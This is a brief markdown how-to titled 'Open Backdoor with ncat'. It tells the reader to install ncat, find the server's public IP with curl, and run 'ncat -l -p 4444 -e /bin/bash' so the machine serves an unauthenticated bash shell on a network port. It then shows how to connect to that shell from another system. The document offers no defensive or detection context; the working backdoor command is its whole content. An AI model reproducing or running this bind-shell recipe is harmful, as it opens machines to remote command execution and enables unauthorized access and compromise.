# Open Backdoor with ncat

- Ncat allows you to use the normal cat functionality over networks.

- Install ncat on both side,
  `sudo apt install ncat`

## On Server Side

```BASH
curl http://icanhazip.com
ncat -l -p 4444 -e /bin/bash
```

- To check whether server is listened or not,
  `lsof -i -P -n | grep LISTEN`

## On Your System

- To connect the server from the port opened,
  `ncat $ipAdress 4444`
- or
  `ncat $domainname.com 4444`
